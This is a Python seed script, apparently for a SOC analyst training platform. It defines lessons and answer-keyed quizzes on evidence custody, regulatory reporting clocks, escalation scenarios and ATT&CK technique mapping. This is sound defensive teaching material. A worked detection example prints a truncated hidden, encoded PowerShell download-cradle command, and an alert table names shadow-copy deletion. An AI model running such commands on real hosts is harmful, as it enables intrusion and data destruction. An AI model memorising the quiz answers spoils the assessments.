### Live-forensics vs containment trade-off

- **Containment first** if the host is actively exfiltrating or moving laterally.
- **Image first** if the host is contained at the network layer (EDR isolation) and IR wants memory/disk.
- L1 is rarely the decision-maker here. L1's role is to *flag the trade-off* and *not unilaterally power-cycle* the box.

### L1 chain-of-custody rules of thumb

1. **Don't run unfamiliar tooling against a host without IR clearance.** Especially DFIR tools (Volatility, KAPE, Velociraptor agents) — if these aren't already deployed and you aren't certified, don't.
2. **Don't shut down or reboot a machine that L2 may want live.** Network-isolate via EDR instead.
3. **Hash everything you pull out.** SHA-256 + collector + UTC timestamp + ticket ID.
4. **Keep originals; work on copies.**
5. **Document time skews.** Don't assume clocks are right.
6. **Don't share artefacts on channels with looser TLP than the marking requires.**

```mermaid
flowchart LR
    C[Collection] --> H[Hash SHA-256]
    H --> S[Seal in ticket]
    S --> T[Transfer to L2/IR]
    T --> A[Analyst working copy]
    A --> R[Return + retention]
    R --> X[Disposal per policy]
```

## Communication discipline

### Channel hygiene

| Severity / context | Appropriate channels |
|---|---|
| P3 / P4 routine | SOC ticket comments, team Slack / Teams |
| P2 high | SOC ticket + dedicated incident channel |
| P1 critical | Incident channel + paging + voice bridge / war room |
| Sensitive (insider, legal) | Restricted channel + voice; never general Slack |
| Press-adjacent | Voice / in-person; minimal written trail outside Legal |

### The 3-line update

For execs and other non-technical stakeholders. Memorise the shape:

```
WHAT HAPPENED:    one sentence, plain English, no acronyms.
IMPACT:           one sentence on scope, users, services.
WHAT'S BEING DONE: one sentence on action + next checkpoint.
```

Example:

> **WHAT HAPPENED:** A senior staff member's email account was accessed by an attacker who stole a login session.
>
> **IMPACT:** One user; mailbox access only; no evidence of further spread; no customer data confirmed exposed yet.
>
> **WHAT'S BEING DONE:** Account locked, session revoked; forensics underway; next update at 10:30.

### Status-update cadence

| Severity | Cadence | Audience |
|---|---|---|
| P1 active | Every 15 min | Incident channel + execs (3-line) |
| P1 stable / contained | Every 30 min, then hourly | Incident channel |
| P2 active | Every 30–60 min | Incident channel |
| P3 | At disposition | Ticket comments |

Cadence is a *promise.* If you said "next update at 10:30," at 10:30 there must be an update — even if it's *"no change since 10:00."*

### Plain language

No SOC-internal acronyms in messages going beyond the SOC. *"AiTM token theft"* becomes *"stolen login session."* *"DCSync"* becomes *"attacker reading password material from our identity system."* Specific. Plain. No mystery.

### TLP and information sharing

What can be said where is determined by TLP. TLP:RED stays in the named room. TLP:AMBER+STRICT stays inside the immediate org. TLP:AMBER stays inside org + immediate clients. TLP:GREEN is community-shareable. TLP:CLEAR is public. Get this wrong and a "share" can become a TLP-violation incident in itself.

### The "no surprises" rule

Escalate facts before they appear in a Slack thread, a press article, or a customer ticket. *Anyone whose seat in the org will hear about this must hear it from the SOC first.*

## Glossary

- **Time of awareness** — load-bearing timestamp in every handover; starts regulator clocks.
- **Irreducible minimum** — the five fields no handover may omit (severity, awareness time, scope, ask, link).
- **RFC 3227 order of volatility** — RAM is *more* volatile than disk; don't power off a host L2 may want imaged live.
- **3-line update** — what happened / impact / what's being done — in plain language, no acronyms.

## Further reading

- RFC 3227 — *Guidelines for Evidence Collection and Archiving.*
- FIRST TLP 2.0.
- ION case audit log — *automatic* chain of custody for in-platform actions.
""",
    )
    m7l3q = _add_lesson(
        session, mod7, order=6, title="Handover, custody, comms — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on RFC 3227 order of volatility, the irreducible minimum, the 3-line update shape, and inbox-rule preservation discipline.",
    )
    _add_q(session, m7l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Per RFC 3227's *order of volatility*, which of the following should be collected *first* during evidence acquisition?",
        options=[
            {"value": "disk", "label": "Disk image"},
            {"value": "ram", "label": "Memory contents (RAM, including process table and kernel statistics)"},
            {"value": "tape", "label": "Archived backup tapes"},
            {"value": "topo", "label": "Network topology diagram"},
        ],
        correct="ram",
        explanation_md="RFC 3227 ranks RAM and live-process state as more volatile than disk, temporary file systems, or archives. The practical L1 takeaway: do not power-cycle a host that L2/IR may want to image live — RAM is gone the moment power is lost.",
        points=2,
    )
    _add_q(session, m7l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which fields are part of the *irreducible minimum* every L1 handover must include, even on a 5-line escalation?",
        options=[
            {"value": "sev", "label": "Severity / proposed priority"},
            {"value": "awareness", "label": "Time of awareness (UTC)"},
            {"value": "scope", "label": "Affected entity / scope"},
            {"value": "motive", "label": "Speculation about adversary motive"},
            {"value": "ask", "label": "Action requested + why"},
            {"value": "link", "label": "Link to full evidence (case ID)"},
        ],
        correct=["sev", "awareness", "scope", "ask", "link"],
        explanation_md="The five irreducible fields are severity, time of awareness, scope, action requested + why, and a link to evidence. Speculation about motive is something to keep *out* of handovers — facts only, especially in HR/Legal-adjacent cases.",
        points=3,
    )
    _add_q(session, m7l3q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="When containing an attacker-created inbox rule for finance keywords, the L1 should *delete* the rule immediately so the attacker cannot use it again.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** Disable rather than delete. The rule is evidence — for L2 forensics, for chain of custody, potentially for Legal / regulatory inquiry. Disabling neutralises the threat while preserving the artefact; deletion destroys it.",
        points=2,
    )
    _add_q(session, m7l3q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="Name the three components of the **3-line update** the L1 should use for non-technical executive stakeholders. Three short phrases.",
        options=None,
        correct=["what happened, impact, what's being done", "what happened impact what's being done", "what happened / impact / what's being done", "what happened, impact, what is being done"],
        explanation_md="The 3-line update is **What happened / Impact / What's being done** — one sentence each, plain English, no acronyms. It's the canonical way to brief executives during an active incident.",
        points=2,
    )

    # Lesson 7.4 — External clocks, CERT/ISAC, ION conventions, scenarios
    m7l4 = _add_lesson(
        session, mod7, order=7,
        title="External reporting, CERTs and ISACs, ION conventions, and worked scenarios",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recognise the major external reporting clocks — GDPR Art.33 (72h), NIS2 (24h / 72h / 30d), DORA, SEC 8-K Item 1.05 (4 business days), HIPAA Breach Notification (60d for ≥500), CIRCIA, sectoral (PCI / TSA / NERC CIP)
> 2. Identify the right national CERT for a jurisdiction and the right ISAC for a sector
> 3. Apply ION-specific escalation conventions — case state machine, Bob's verdict, the ticker as an escalation trigger, the audit log as automatic chain of custody, CaseClosureReason as a feedback loop
> 4. Walk three worked end-to-end scenarios — confirmed AiTM, suspected insider exfil, mass phishing with regulator-clock implications

## External reporting timelines

L1 is not a lawyer. L1 *is* the person whose *time of awareness* starts these clocks, so L1 must know the clocks exist and how tight they are.

### GDPR Article 33 — Notification of a personal data breach

- Source: Regulation (EU) 2016/679, Art. 33.
- Trigger: controller becomes aware of a personal-data breach.
- Window: **without undue delay and, where feasible, not later than 72 hours after having become aware.**
- Exception: *unless the personal data breach is unlikely to result in a risk to the rights and freedoms of natural persons.*
- Article 34: notify data subjects without undue delay where the breach is likely to result in a *high* risk.
- Practical: L1 logs the time of awareness *exactly.* That timestamp may end up in a regulator filing.

### NIS2 Directive (EU 2022/2555)

In force from October 2024 (national transpositions varied). Applies to *essential* and *important* entities.

- **Early warning** to the CSIRT or competent authority **within 24 hours** of becoming aware of a significant incident.
- **Incident notification** with initial assessment, severity and impact, IOCs, **within 72 hours**.
- **Final report within 1 month** (or progress report if not yet resolved).

### DORA (EU 2022/2554) — financial sector

Applicable from January 17, 2025. Major ICT-related incidents: initial / intermediate / final reports on prescribed timelines (see ESAs RTS / ITS for exact windows; verify against current primary sources before claiming specific numbers).

### SEC Form 8-K Item 1.05 — US public companies

- 17 CFR § 229.106 / Item 1.05 of Form 8-K, effective Dec 18, 2023.
- Trigger: registrant determines a cybersecurity incident is **material**.
- Window: **disclose within 4 business days** of the materiality determination (with limited DOJ-led national-security delay).

### HIPAA Breach Notification Rule — US healthcare

- 45 CFR §§ 164.400–414.
- Breach affecting **≥ 500 individuals**: notify HHS *without unreasonable delay and in no case later than 60 calendar days* after discovery; notify affected individuals; notify prominent media.
- Breach affecting **< 500**: maintain a log; submit annually to HHS within 60 days of end of calendar year.

### Other regimes the L1 should *recognise*

- **US state breach laws** — all 50 states + DC + several territories. CCPA / CPRA, NY SHIELD, Massachusetts 201 CMR 17, Texas, Illinois (BIPA for biometric). Windows vary; *that they exist and are time-pressured* is what matters at L1.
- **UK GDPR + DPA 2018** — ICO supervisory authority, equivalent regime.
- **UK NIS Regulations 2018** — OES / RDSPs.
- **PCI-DSS** — incident notification to acquirer + card brands; PCI Forensic Investigator (PFI) engagement requirements.
- **TSA security directives** (US pipelines / aviation / rail) — within **24 hours** of identifying a cybersecurity incident.
- **FERC / NERC CIP-008** — bulk-electric system; reporting to E-ISAC and DOE within 1 hour of determination.
- **CIRCIA (US)** — Cyber Incident Reporting for Critical Infrastructure Act 2022; final rule under CISA defines covered entities and (proposed) **72-hour** reporting + **24-hour** ransom-payment reporting. Phased in.

```mermaid
gantt
    title External reporting clocks (illustrative; verify per-jurisdiction)
    dateFormat HH
    axisFormat +%Hh
    section NIS2
    24h early warning   :a1, 00, 24h
    72h notification    :a2, 00, 72h
    section GDPR Art.33
    72h to SA           :b1, 00, 72h
    section SEC 8-K
    4 bd from materiality :c1, 00, 96h
    section HIPAA >=500
    60d notify          :d1, 00, 1440h
```

The takeaway: **the moment you become aware** is the moment a clock may have started. *Document it precisely.*

## National CERTs and ISACs

### National CERTs the L1 should recognise

- **NCSC (UK)** — National Cyber Security Centre, part of GCHQ.
- **CISA (US)** — Cybersecurity and Infrastructure Security Agency, part of DHS. Operates KEV catalogue, runs JCDC.
- **BSI / CERT-Bund (DE)**, **ANSSI / CERT-FR (FR)**, **JPCERT/CC (JP)**, **AusCERT / ACSC (AU)**, **CCCS (CA)**, **CERT-EU**, **ENISA**.

These cooperate via FIRST and (for a subset) the Five Eyes intelligence-sharing community.

### ISACs by sector

| ISAC | Sector |
|---|---|
| FS-ISAC | Financial services |
| MS-ISAC | US state, local, tribal, territorial gov |
| H-ISAC | Health |
| E-ISAC | Electricity / NERC |
| Auto-ISAC | Automotive |
| Aviation-ISAC | Aviation |
| Space-ISAC | Space |
| WaterISAC | Water utilities |
| ND-ISAC | National Defense |
| REN-ISAC | Higher education / research |
| Retail-ISAC | Retail |
| MFG-ISAC | Manufacturing |

ISAC sharing is TLP-controlled and member-only. L1 typically *consumes* ISAC bulletins via the org's CTI feed; production and submission is normally TI's job.

### Reporting portals (cheat sheet)

| Portal | URL | Purpose |
|---|---|---|
| CISA | cisa.gov/report | US incident reporting |
| FBI IC3 | ic3.gov | US cybercrime |
| NCSC UK | ncsc.gov.uk | UK incident reporting |
| Action Fraud (UK) | actionfraud.police.uk | UK consumer / SME fraud |
| ICO (UK) | ico.org.uk | UK data-protection breach |

### What to share

TLP-conformant indicators, pattern descriptions, impact summaries. **Never PII unless legally required.** Pseudonymise users (`hr-director@<redacted>` → `<user-A>`) when sharing externally.

## ION-specific escalation conventions

### Case state machine

ION cases progress: **open → investigating → escalated → closed**. The transition `investigating → escalated` is the natural moment for the handover packet to be finalised. `closed` requires a `CaseClosureReason` — aligning case closure with the closure-vs-escalation taxonomy of this module.

### Bob (the AI analyst)

Bob produces a verdict + confidence on most alerts. When Bob's verdict is `escalate` with **high** confidence, it's a strong nudge but never an authority — the L1 still owns the disposition. When Bob's verdict is `close` with **high** confidence and the L1 disagrees, escalate *and flag the disagreement* — it's a tuning signal for Bob's prompt template / tier.

### The ticker strip

Critical alerts that have been open without a case for **N minutes** surface on the ticker. The ticker is *itself* an escalation trigger: an L1 who walks into the SOC and sees a 3-hour-old critical on the ticker has an immediate handover-or-explain duty.

### Audit log = automatic chain of custody (in-platform)

Every action in ION is audited — actor, timestamp, action, target. For in-platform actions chain of custody is automatic. For *out-of-platform* actions (an analyst running a CLI on a workstation), L1 records the action manually in the case timeline.

### CaseClosureReason taxonomy

Closure reasons feed the AIFeedback ledger and per-template scorecards (the Tier-1 training foundation for Bob). L1 should pick the closure reason carefully — it shapes how the org's detection content evolves.

### AlertPromptTemplate matcher tiers

When escalating, L1 should be able to name *which prompt-template tier* matched the alert (rule_id → regex → MITRE technique → tactic → groups). This information is gold for Detection Engineering.

## Worked scenarios

### Scenario A — Confirmed AiTM with token theft

**Alert:** Defender for Cloud Apps *"Suspicious inbox forwarding"* on `hr-director@corp.example`.

**Triage (08:14–08:30 UTC):**

- L1 alice opens case at 08:14:02Z (records as time of awareness).
- Sign-in audit: 08:02:11 sign-in from `198.51.100.42` (Bulgaria, residential ASN). MFA-satisfied. Token issued.
- Inbox-rule audit: 08:02:14 new rule "Move to RSS Subs" matching subject CONTAINS "invoice".
- Graph audit: 08:08:30 `MailRead.All` exercise from same IP.
- Hypothesis: AiTM (Tycoon / EvilProxy class) → token replay → invoice-fraud staging.

**Decisions:** Severity P1. Asset criticality: HR-Director (PII access). Escalation paths: **L2** (forensics), **Identity** (revoke), **IT** (forced password reset post-revoke), **Legal** (PII exposure assessment).

**Actions L1 takes (within authority):**

- Disables (does not delete) the inbox rule, with L2 acknowledgement, at 08:23:05Z.
- Hashes signin-export, inbox-rules JSON, Graph audit JSON, screenshot of phish lure.
- Notifies SOC duty manager at 08:24Z. Pages L2 + Identity at 08:25Z + 08:26Z.

**Actions L1 does NOT take:** token revoke (Identity authority), password reset (IT, post-revoke), user notification (duty manager handles, with talking-points from L1), Legal contact (proposes 08:45Z trigger if data-touch confirmed).

**Regulatory:** GDPR Art.33 clock potentially started at 08:14:02Z. Legal will determine whether risk-to-rights threshold is met; the clock the org will be held to *is L1's recorded awareness time.*

### Scenario B — Suspected insider data exfil

**Alert:** DLP — large outbound transfer to a personal cloud-storage domain by `engineer-sam@corp.example`. Engineer Sam is on a known-departing list.

**Triage:** L1 confirms 4.7 GB to personal Dropbox in 14 minutes at 23:42 local on a Sunday. EDR confirms `Dropbox.exe` invoked, files from `\\Projects\\<repo>` (source code). Badge data: Sam is *not* on premises; remote VPN session.

**Decisions:** Severity P1 (suspected insider IP exfil). Escalation paths: **L2** (forensics), **HR** (personnel action), **Legal** (litigation hold), possibly **Law Enforcement** (later, via Legal).

**Critical L1 disciplines:**

- **Don't tip off the suspect.** No user notification. No password reset that might alert. Account left active under monitoring (with L2 / IR / Legal call).
- **Chain of custody is paramount.** Hash every artefact at collection. Don't run anything that modifies system state.
- **Handover packet is fact-only.** No speculation about motive.
- **HR-Security liaison only.** Not a line HR rep. Not a general Slack channel.

**Stakeholder routing:** L2 + IR (incident commander) → HR-Security liaison (factual brief) → Legal (litigation hold; preservation order on email, laptop, badge, VPN logs) → IT (do *not* reimage; preserve in current state; image with write-blocker if Legal directs) → Comms / management (notified by IR/CISO; L1 does not engage). Law enforcement is a Legal-led decision; L1's role is preservation.

### Scenario C — Mass phishing with ≥ 50 confirmed clicks

**Alert:** SIEM correlation — *"Mass phishing campaign — 50+ users clicked URL pointing to `corp-login.auth-portal[.]xyz` in the last 30 minutes."*

**Triage:** L1 carla opens case at 14:02Z. Domain registered yesterday, hosted on attacker IP cluster, mimics corp-login (visual clone). Sign-in audit: **17 of 50+** users completed MFA-satisfied sign-ins in the post-click window. Token theft confirmed for at least 17. Pattern: AiTM kit + automated post-auth follow-up; multiple inbox rules already created across affected mailboxes.

**Decisions:** Severity P1 / declared incident. IR engaged immediately. Escalation paths: **IR** (incident commander), **L2** (forensics squad), **Identity** (mass revocation), **IT** (mass password reset), **Legal** (regulator clock), **Comms** (likely public-facing), **CTI** (campaign IoCs), **Detection Engineering** (rule fired late — tune), **MSSP / Microsoft** (vendor support).

**Time-pressure interaction:**

- 17+ users with PII access → **GDPR Art.33** likely triggered. 72-hour clock from 14:02Z = next-Wednesday 14:02Z. Legal informed at 14:15Z.
- Org is an EU "essential entity" under **NIS2** → 24-hour early warning to CSIRT due by tomorrow 14:02Z.
- Org is a US-listed public company → **SEC 8-K Item 1.05** materiality determination is the trigger (not awareness); counsel will assess. 4 business days from materiality determination.

**Mass action:** Identity executes session/refresh-token revoke for the 17 confirmed + a precautionary list of all 50+ clickers. IT executes forced password reset. Comms drafts customer-facing statement (held; not sent without IR / CISO / Legal sign-off). CTI publishes internal IOC bulletin (TLP:AMBER+STRICT) and prepares ISAC submission (TLP:AMBER, pseudonymised). DE opens a tuning ticket (rule fired late; root cause: 30-min correlation window too long).

This scenario shows how a single L1 ticket cascades into **9 escalation paths within the first hour.** L1's discipline is to package the initial handover so L2 / IR can run the cascade — *not* to try to run it themselves.

## Glossary

- **GDPR Art.33 / NIS2 24-72-30 / SEC 8-K 4-bd / HIPAA 60d** — the four reporting clocks every L1 should recognise on sight.
- **Materiality determination** — SEC 8-K's trigger; differs from "awareness."
- **CIRCIA** — phased-in US critical-infrastructure reporting (proposed 72h + 24h ransom).
- **ION case state machine** — `open → investigating → escalated → closed`; `closed` requires a `CaseClosureReason`.
- **Ticker as escalation trigger** — a critical alert open without a case past N minutes is *itself* a signal.

## Further reading

- GDPR Art.33 / Art.34 — Regulation (EU) 2016/679.
- NIS2 Directive Art.23 — Directive (EU) 2022/2555.
- DORA — Regulation (EU) 2022/2554.
- SEC Form 8-K Item 1.05 / 17 CFR § 229.106 — SEC Final Rule 33-11216, 2023.
- HIPAA Breach Notification Rule — 45 CFR §§ 164.400–414.
- FIRST CSIRT Services Framework v2.1.
""",
    )
    m7l4q = _add_lesson(
        session, mod7, order=8, title="Clocks, CERTs, ION & scenarios — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on regulatory windows, CERT / ISAC selection, ION conventions, and the insider-exfil scenario disciplines.",
    )
    _add_q(session, m7l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A controller becomes aware of a personal-data breach involving EU citizens at 14:00 UTC on Monday. Per GDPR Article 33, by when must the supervisory authority be notified, assuming the risk-to-rights-and-freedoms threshold is met?",
        options=[
            {"value": "48h", "label": "14:00 UTC Wednesday — 48 hours"},
            {"value": "72h", "label": "14:00 UTC Thursday — 72 hours"},
            {"value": "month", "label": "End of the calendar month"},
            {"value": "4bd", "label": "Within 4 business days"},
        ],
        correct="72h",
        explanation_md="GDPR Art.33 requires notification *without undue delay and, where feasible, not later than 72 hours after having become aware.* The clock starts at awareness, not at the breach event. 4 business days is the SEC 8-K Item 1.05 window for material cybersecurity incidents — different regime.",
        points=2,
    )
    _add_q(session, m7l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *true* about the NIS2 Directive's incident-reporting cascade for essential / important entities?",
        options=[
            {"value": "early24", "label": "An early warning is required within 24 hours of becoming aware of a significant incident"},
            {"value": "notif72", "label": "An incident notification with initial assessment is required within 72 hours"},
            {"value": "final30", "label": "A final report (or progress report if unresolved) is required within 1 month"},
            {"value": "us_only", "label": "It only applies to US-headquartered companies"},
            {"value": "voluntary", "label": "All notifications are voluntary"},
        ],
        correct=["early24", "notif72", "final30"],
        explanation_md="NIS2 codifies a 24h / 72h / 30d cascade for essential and important entities (Annex I/II). It is an EU directive (Directive (EU) 2022/2555) and the notifications are mandatory for in-scope entities — not voluntary, not US-specific.",
        points=3,
    )
    _add_q(session, m7l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="During a suspected insider data-exfil incident, the L1 confirms 4.7 GB went to a personal cloud-storage account from a departing engineer's laptop. Which of the following is the **wrong** action for the L1 to take next?",
        options=[
            {"value": "hash", "label": "Hash every artefact at collection time and record collector + UTC timestamp"},
            {"value": "hr_liaison", "label": "Notify the HR-Security liaison via the established channel with facts only"},
            {"value": "preserve", "label": "Leave the laptop in its current state; do not reimage; flag preservation to IT"},
            {"value": "user_pwreset", "label": "Force a password reset and email the user telling them their account behaviour is being investigated"},
        ],
        correct="user_pwreset",
        explanation_md="Tipping off the suspect destroys evidence and may sabotage HR / Legal / law-enforcement options. Account is left active under monitoring (with L2 / IR / Legal call); password resets and user notifications are decided by IR / Legal, not unilaterally by L1.",
        points=2,
    )
    _add_q(session, m7l4q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="In ION, an alert that has been open without a case for past the ticker threshold (N minutes for criticals) is *itself* an escalation trigger that the next L1 walking into the SOC has a duty to handover-or-explain.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** The ticker exists precisely so a critical that drifts past N minutes without a case becomes visible. ION's design treats the ticker as an escalation surface, not just a status display — finding one open and accepting it without a handover/explanation is itself a missed-escalation signal.",
        points=2,
    )

    # ── Module 8 — Common ATT&CK Techniques (L1 FINALE) ──────────────────
    # Capstone lesson: ties Modules 1-7 together by walking the L1 through
    # the ATT&CK techniques most often seen in real triage, anchored to
    # the telemetry from prior modules. By the end the analyst can hear
    # an alert, name the technique, predict corroborating telemetry, and
    # feed the classification into the Module 7 escalation framework.
    mod8 = _add_module(
        session, course, order=8,
        title="Common ATT&CK Techniques",
        description_md=(
            "L1 FINALE — the capstone module. The ATT&CK framework as "
            "an L1 sees it (tactic / technique / sub-technique / "
            "procedure, the matrices, Navigator, versioning); reading "
            "a technique page in 30 s / 3 min / 30 min cadences; the "
            "*top techniques* across Initial Access, Execution, "
            "Persistence, Privilege Escalation, Defense Evasion, "
            "Credential Access, Discovery, Lateral Movement, "
            "Collection, Exfiltration, Impact, and C2 — anchored to "
            "ECS / Sysmon / Defender Advanced Hunting fields and "
            "tied back to Modules 3-7; the modal ransomware-affiliate "
            "and cloud-takeover chains; mapping alert titles to "
            "technique IDs on the fly; ION-specific (matcher tier "
            "3 + tier 4); four worked scenarios — discovery cluster, "
            "LSASS → DCSync, ransomware staging (T1490 → T1486), "
            "edge-vuln → web-shell."
        ),
        estimated_minutes=240,
    )

    # Lesson 8.1 — Framework + reading technique pages + mapping on the fly
    m8l1 = _add_lesson(
        session, mod8, order=1,
        title="The ATT&CK framework, reading a technique page, and mapping alerts on the fly",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Distinguish *tactic*, *technique*, *sub-technique*, and *procedure*, and articulate the four-tier hierarchy
> 2. Navigate the Enterprise / Windows / Cloud / ICS matrix structure and recognise the role of ATT&CK Navigator
> 3. Read a technique page in three cadences — *30-second*, *3-minute*, *30-minute* — and avoid the *zero-second read* anti-pattern
> 4. Map an alert artefact to a technique ID *and* a sub-technique ID
> 5. Recognise ATT&CK versioning (v15/v16 baseline; sub-tech overhaul, cloud-matrix reshuffles) and what to do when a cited ID doesn't render
>
> **Prerequisites.** Modules 1–7 (Alert Lifecycle through Escalation Workflow). This module is the L1 finale and assumes fluency with the telemetry from Modules 3 (Windows Event Logs), 4 (Network Telemetry), 6 (Phishing Triage), and the escalation framework from Module 7.

## ATT&CK is a knowledge base, not a methodology

ATT&CK is a **catalogue** of adversary behaviour — *what attackers do once they have access* — organised into a grid that defenders can use to talk about coverage, detection, and threat-actor TTPs in a single shared vocabulary. For an L1, the framework is best understood as a **lookup table**: an alert fires, you map the alert to a technique ID, and that ID unlocks a body of public knowledge about how the technique manifests, what telemetry betrays it, and what comes next in the kill chain.

## The four-tier hierarchy

ATT&CK Enterprise organises adversary behaviour into four nested concepts:

- **Tactic** — the adversary's *goal* at a stage of an intrusion. 14 enterprise tactics, each with a `TA####` identifier:
  - **TA0043** Reconnaissance · **TA0042** Resource Development
  - **TA0001** Initial Access · **TA0002** Execution · **TA0003** Persistence · **TA0004** Privilege Escalation
  - **TA0005** Defense Evasion · **TA0006** Credential Access · **TA0007** Discovery · **TA0008** Lateral Movement
  - **TA0009** Collection · **TA0011** Command and Control · **TA0010** Exfiltration · **TA0040** Impact
- **Technique** — *how* the goal is achieved. `T####` identifier (e.g. **T1059** Command and Scripting Interpreter).
- **Sub-technique** — finer-grained variant. `T####.###` (e.g. **T1059.001** PowerShell). Sub-techniques were introduced in mid-2020 (the "sub-technique overhaul"); pre-2020 reporting often cites only the parent ID.
- **Procedure** — a specific *instance* of a technique observed in real reporting. ATT&CK records procedures as `Group → Technique` or `Software → Technique` mappings (*"Mustang Panda has used scheduled tasks for persistence"*). Procedures are *evidence*, not classification, and cluster names rotate between vendors. **Cite the technique, not the actor, when in doubt.**

A technique can belong to *multiple* tactics — `T1078 Valid Accounts` is simultaneously Initial Access, Persistence, Privilege Escalation, *and* Defense Evasion, because the same behaviour serves four goals at four phases.

## Matrices and platforms

Enterprise ATT&CK is rendered per-platform: **Windows / macOS / Linux** endpoints; **Cloud** (Azure AD/Entra ID, Office 365, Google Workspace, SaaS, IaaS); **Network** (routers/firewalls); **Containers** (K8s/Docker); **ESXi** (added 2024 in v15). Sister knowledge bases exist for **Mobile** (Android/iOS) and **ICS** (a different tactic list, e.g. *Inhibit Response Function*).

L1s on a typical enterprise queue work overwhelmingly inside Enterprise/Windows + Enterprise/Cloud.

## ATT&CK Navigator

`mitre-attack.github.io/attack-navigator/` is a browser-based grid view. A **layer** is a colour-coded JSON overlay. Common types:

- **Coverage layers** — your detection content mapped onto the matrix.
- **Threat-actor layers** — every technique a tracked group has used.
- **Detection-coverage overlays** — combine rule coverage with adversary behaviour to identify *gaps where detection is missing for techniques the relevant adversary uses*.

Recognise that the colours encode *coverage*, not *prevalence* — green is "we can see it," not "it is happening now."

## Versioning — IDs are sticky but not immutable

ATT&CK ships major versions roughly twice a year. Inflection points:

- **v6 (2019)** — pre-sub-technique baseline.
- **v7 (mid-2020)** — sub-technique overhaul; many parent techniques split.
- **v9–v10 (2021)** — Cloud platform broken out; Data Source taxonomy redesigned.
- **v14 (late 2023)** — assets, mobile structured detections.
- **v15 (early 2024)** — ESXi platform added.
- **v16 (late 2024) / v17 (2025)** — cloud-matrix cleanup.

A handful of techniques have been deprecated or merged. When citing, use the technique ID + name + ATT&CK version. *"If a technique number doesn't render on `attack.mitre.org`, search the technique name — it may have been merged or renumbered."*

## Reading a technique page like an L1 — worked example: T1059.001 PowerShell

A technique page has a fixed structure. You don't need to read the whole page on every alert; you need to know *where to jump.*

| Section | What it gives you |
|---|---|
| **Description** | Plain-English what-is-it. Skim only when unfamiliar |
| **Sub-techniques row** | The variant list — pick the one that matches your artefact |
| **Procedure examples** | *"Group X has used …"* paragraphs. Useful for "is this in their playbook?" but **don't** quote group names into case metadata |
| **Mitigations** | M-numbers; informs the question *"why didn't this get blocked?"* |
| **Detections** | Analytic patterns — the L1's most-used section after Description |
| **Data Sources / Components** | Post-2021 taxonomy: *Process: Process Creation*, *Command: Command Execution*, *Module: Module Load*, *Script: Script Execution* |
| **References** | Public reporting; useful for novel-technique context, not for case metadata |

### The 30-second / 3-minute / 30-minute reading cadence

- **30-second read** — you've seen this 50 times before. Skim header, confirm sub-tech, copy ID into case. Done.
- **3-minute read** — technique is familiar but the alert variant looks novel. Header → Sub-techniques row → Detection section → first three Procedure examples. Confirm "this is plausible" or spot "this isn't the right technique."
- **30-minute read** — technique is unfamiliar; or you're writing a handover packet. Whole page plus 2+ cited references. Build a mental model of *why* the technique works.

The error-state to avoid is the **zero-second read** — pasting the technique ID from the alert title without verifying the sub-tech matches the artefact. Half of mis-classified cases trace to this.

### Worked snippet — artefact to technique

```text
process.parent.name  = "WINWORD.EXE"
process.name         = "powershell.exe"
process.command_line = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3..."
```

**30-second read on T1059.001.** Sub-tech is unambiguously **PowerShell**. `-enc` + `-w hidden` + `-nop` are explicitly called out in T1059.001's Detection section. Tag the case with **T1059.001** + **T1027.010** (Command Obfuscation, because `-enc` carries an encoded payload).

**3-minute read.** Verify parent process. `WINWORD.EXE` parent of `powershell.exe` is also **T1204.002** (User Execution: Malicious File). Add it. The case now carries three precise technique IDs; ION's matcher tiers 3 and 4 will land cleanly.

## Mapping ATT&CK Data Components to your stack

| ATT&CK Data Component | Sysmon | Windows Event Log | Defender Advanced Hunting | ECS field |
|---|---|---|---|---|
| Process: Process Creation | EID 1 | 4688 | `DeviceProcessEvents` | `process.command_line`, `process.parent.name` |
| Command: Command Execution | — | PowerShell 4104 | `DeviceProcessEvents` (CommandLine) | `process.command_line` |
| Module: Module Load | EID 7 | PowerShell 4103 | `DeviceImageLoadEvents` | `dll.name`, `process.executable` |
| Network Connection | EID 3 | — | `DeviceNetworkEvents` | `destination.ip`, `destination.domain`, `network.protocol` |
| File Creation | EID 11 | — | `DeviceFileEvents` | `file.path`, `file.hash.sha256` |
| Registry Set | EID 13 | — | `DeviceRegistryEvents` | `registry.path`, `registry.value` |
| DNS Query | EID 22 | — | `DeviceNetworkEvents` (kind=DnsQuery) | `dns.question.name` |

## Mapping alerts to ATT&CK on the fly

The L1's daily reflex. Hear an alert title — *name* the technique. Drill these:

| Alert title | Technique(s) | Reasoning |
|---|---|---|
| *"Anomalous PowerShell encoded command"* | **T1059.001** + **T1027.010** | PowerShell sub-tech; `-enc` = command obfuscation |
| *"LSASS read by non-system process"* | **T1003.001** | OS Credential Dumping → LSASS Memory |
| *"Service created from binary in user-writable path"* | **T1543.003** + **T1036.005** | Service-create persistence; user-writable path = masquerade |
| *"Suspicious child of WINWORD"* | **T1204.002** + **T1059.{001\\|003\\|005}** | User opened malicious doc → script interpreter spawned |
| *"DCSync from non-DC source"* | **T1003.006** | Replication API abuse from a workstation |
| *"Inbox rule moves invoice keywords"* | **T1114.003** | Email forwarding/collection rule, Module 6 BEC |
| *"vssadmin delete shadows"* | **T1490** | Inhibit System Recovery — *page everyone* |
| *"Outbound to NRD via raw TLS"* | **T1071.001** + **T1573.002** | Web protocol C2 over TLS to newly-registered domain |
| *"Kerberos TGS request with RC4 enc-type"* | **T1558.003** | Kerberoasting downgrade |
| *"4624 NTLM logon type 9 from workstation"* | **T1550.002** | Pass-the-Hash signature |
